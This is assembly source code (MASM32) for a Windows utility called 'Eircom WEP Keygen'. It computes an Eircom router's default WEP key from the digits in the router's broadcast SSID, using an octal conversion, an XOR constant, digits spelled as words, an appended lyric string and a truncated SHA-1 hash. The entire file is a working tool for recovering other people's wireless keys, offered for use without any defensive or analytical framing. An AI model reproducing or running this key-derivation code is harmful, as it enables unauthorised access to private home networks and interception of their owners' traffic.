.386
.model flat, stdcall
option casemap: none

include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\comctl32.inc
include \masm32\include\advapi32.inc

includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\comctl32.lib
includelib \masm32\lib\advapi32.lib

DialogProc PROTO : HWND, : UINT, : WPARAM, : LPARAM
IdProc     PROTO : HWND, : UINT, : WPARAM, : LPARAM
KeygenProc PROTO : HWND
HandleError proto :DWORD

.const
IDD_KEYGEN       equ 100
IDC_TITLE        equ 400
IDC_GENERATE     equ 402
IDC_COPY         equ 403
IDC_EXIT         equ 404
IDC_SSID         equ 405
IDC_WEP          equ 406
IDC_INFO         equ 407

PROV_RSA_FULL    equ 1
ALG_CLASS_HASH   equ 32768
ALG_TYPE_ANY     equ 0
ALG_SID_SHA1     equ 4
ALG_SID_RC2      equ 2
ALG_TYPE_BLOCK   equ 1536
ALG_CLASS_DATA_ENCRYPT   equ 24576
CALG_RC2         equ ALG_CLASS_DATA_ENCRYPT or ALG_TYPE_BLOCK or ALG_SID_RC2
CALG_SHA1        equ ALG_CLASS_HASH or ALG_TYPE_ANY or ALG_SID_SHA1
CRYPT_VERIFYCONTEXT      equ   0F0000000h
HP_HASHVAL       equ 2

.data
szTitle       db "Eircom WEP Keygen - Damo", 0
szDefaultName db "24615102", 0
szErrorTitle  db "Error!", 0
szError       db "Invalid Eircom SSID!", 10, 13, "Enter a SSID of ", 34, "eircom2341 3423", 34
                 db " as: 23413423", 10, 13, "SSID must be 8 digits in range of 0-7.", 0
szFormat      db "%ld", 0
szFormat1     db "%.2x", 0

szZero        db "Zero", 0
szOne         db "One", 0
szTwo         db "Two", 0
szThree       db "Three", 0
szFour        db "Four", 0
szFive        db "Five", 0          
szSix         db "Six", 0
szSeven       db "Seven", 0      
szEight       db "Eight", 0
szNine        db "Nine", 0
szHendrix     db "Although your world wonders me, ", 0

szNumbers     dd OFFSET szZero, OFFSET szOne, OFFSET szTwo, OFFSET szThree,
                 OFFSET szFour, OFFSET  szFive, OFFSET szSix, OFFSET szSeven,
                 OFFSET szEight, OFFSET szNine, 0
               
.data?
szSsid        db 9 dup(?)
szWep         db 21 dup(?)
szSerial      db 9 dup(?)
szToHash      db 256 dup(?)
hInstance     HINSTANCE ?
hIdCursor     HCURSOR   ?
OldIdProc     WNDPROC   ?
cspHAND       dd ?
lKey          dd ?
lHash         dd ?
strLen        dd ?
szHash        dd ?
szHashBytes   db 256 dup(?)
szResult      db 256 dup(?)  
szTempBuf     db 2 dup(?)

.code
start:

INVOKE InitCommonControls

INVOKE GetModuleHandle, NULL
mov hInstance, eax

INVOKE LoadCursor, NULL, IDC_HAND
mov hIdCursor, eax

INVOKE DialogBoxParam, hInstance, IDD_KEYGEN, NULL, ADDR DialogProc, 0

INVOKE ExitProcess, 0



DialogProc PROC hWnd: HWND, uMsg: UINT, wParam: WPARAM, lParam: LPARAM

  .IF uMsg == WM_INITDIALOG    
    INVOKE SetWindowLong, eax, GWL_WNDPROC, ADDR IdProc
    mov OldIdProc, eax

    INVOKE SendDlgItemMessage, hWnd, IDC_SSID, EM_SETLIMITTEXT, 8, 0

    INVOKE SetDlgItemText, hWnd, IDC_SSID, ADDR szDefaultName

  .ELSEIF uMsg == WM_COMMAND


    .IF wParam == IDC_GENERATE
      INVOKE KeygenProc, hWnd
    .ELSEIF wParam == IDC_EXIT
      INVOKE SendMessage, hWnd, WM_CLOSE, 0, 0
    .ENDIF

  .ELSEIF uMsg == WM_CLOSE
    INVOKE EndDialog, hWnd, 0
  .ENDIF

  xor eax, eax
  ret
DialogProc ENDP



IdProc PROC hWnd: HWND, uMsg: UINT, wParam: WPARAM, lParam: LPARAM

  .IF uMsg == WM_SETCURSOR
    INVOKE SetCursor, hIdCursor
  .ELSE
    INVOKE CallWindowProc, OldIdProc, hWnd, uMsg, wParam, lParam

    ret
  .ENDIF

  xor eax, eax
  ret
IdProc ENDP

KeygenProc PROC hWnd: HWND
  push edi
  push esi
  push ebx 
  
  mov [BYTE PTR szSerial], 0
  mov [BYTE PTR szToHash], 0
  mov [BYTE PTR szResult], 0
  
  push SIZEOF szSsid
  push OFFSET szSsid
  push IDC_SSID
  push hWnd
  call GetDlgItemText
  
  lea edi, szSsid  
  push edi
  call lstrlen
  cmp eax, 8h
  jne error  

  xor edx, edx
  xor ecx, ecx
  xor esi, esi
  
  oct2bin:
  cmp esi, 8h
  je serial
  mov eax, ecx
  lea edx, [eax*8]
  lea eax, [szSsid+esi]
  movzx eax, BYTE PTR [eax]
  cmp eax, 30h
  jl error
  cmp eax, 37h
  jg error
  lea eax, [eax+edx]
  sub eax, 30h
  mov ecx, eax
  lea eax, szSsid
  inc esi
  jmp oct2bin

  serial:
  xor ecx, 0fcch
  add ecx, 1000000h
  
  push ecx
  push OFFSET szFormat
  push OFFSET szSerial
  call wsprintf
  
  xor esi, esi
  
  makestring:
  lea edx, [szSerial+esi]
  movzx edx, BYTE PTR [edx]
  sub edx, 30h
  cmp esi, 8
  je makehash
  sub edx, 1
  mov eax, szNumbers[edx*4]
  push eax
  push OFFSET szToHash
  call lstrcat
  inc esi
  jmp makestring
  
  makehash:
  push OFFSET szHendrix
  push OFFSET szToHash
  call lstrcat
  
  invoke CryptAcquireContext, ADDR cspHAND, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT
  invoke CryptCreateHash, cspHAND, CALG_SHA1, 0, 0, ADDR lHash  
  lea edi, szToHash
  push edi
  call lstrlen
  mov strLen, eax
  invoke CryptHashData, lHash, OFFSET szToHash, strLen, 0  
  invoke CryptGetHashParam, lHash, HP_HASHVAL, 0, OFFSET szHash, 0
  invoke CryptGetHashParam, lHash, HP_HASHVAL, OFFSET szHashBytes, OFFSET szHash, 0
  invoke CryptDestroyHash, ADDR lHash
  invoke CryptReleaseContext, cspHAND, 0
    
  xor esi, esi
  
  bin2str:
  cmp esi, 13
  je done  
  lea ecx, szHashBytes
  movzx eax, BYTE PTR [ecx+esi]
  push eax
  push OFFSET szFormat1
  push OFFSET szTempBuf
  call wsprintf    
  push OFFSET szTempBuf
  Push OFFSET szResult
  call lstrcat
  inc esi
  jmp bin2str
  
  done:
  push OFFSET szResult
  push IDC_WEP
  push hWnd
  call SetDlgItemText  
  jmp endkeygen

  error:
  push MB_ICONERROR
  push OFFSET szErrorTitle
  push OFFSET szError
  push hWnd
  call MessageBox

  endkeygen:
  pop ebx
  pop esi
  pop edi

  ret

KeygenProc ENDP

END start
